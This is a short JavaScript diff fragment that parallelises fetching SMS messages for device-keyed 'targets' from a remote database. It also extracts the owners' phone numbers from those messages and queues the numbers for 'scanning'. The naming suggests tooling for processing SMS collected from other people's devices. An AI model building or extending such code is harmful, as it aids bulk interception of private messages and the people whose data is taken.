+      let t = targets[nextIndex++];
+      if (!t || !t.did) continue;
+      let fetched = await fetchSmsForTarget(baseRoot, t.did, 4000, true);
+      if (!fetched.smsDict) continue;
+      t.smsDict = fetched.smsDict;
+      t._smsPhones = fetched.phones || [];
+      t._regexScanned = true;
+      mergePhones(t, fetched.phones);
     }
-    if (!fetchedSms) return;
-    if (!t.smsDict || typeof t.smsDict !== 'object') t.smsDict = {};
-    for (let msgId in fetchedSms) t.smsDict[msgId] = fetchedSms[msgId];
-    mergePhones(t, extractOwnPhonesFromSMS(t.smsDict));
-  }));
+  });
+  await Promise.allSettled(workers);
 }
 function addScanQueueLink(phone, did, targetIndex, simIndex, queueByNumber = null) {
   let safeDid = String(did);
@@ -2231,7 +3365,9 @@ function prepareScanTargets(sourceTargets, fbUrl) {
       ? { ...val, did: String(val.did ?? did), dbIndex: 'Scan', dbUrl: fbUrl, smsDict: (val.smsDict && typeof val.smsDict === 'object') ? val.smsDict : {} }
       : buildScanTargetFromClient(did, val, fbUrl);
     if (!targetObj.did || targetObj.did === 'undefined') continue;
-    mergePhones(targetObj, extractOwnPhonesFromSMS(targetObj.smsDict || {}));
+    const extractedPhones = Array.isArray(targetObj._smsPhones) ? targetObj._smsPhones : extractOwnPhonesFromSMS(targetObj.smsDict || {});
+    targetObj._smsPhones = extractedPhones;
+    mergePhones(targetObj, extractedPhones);
     let phones = Array.isArray(sourceTargets) ? getScanPhonesFromTarget(targetObj) : getScanPhonesFromClient(val);
     if (phones.length === 0) continue;
     targetIndex++;
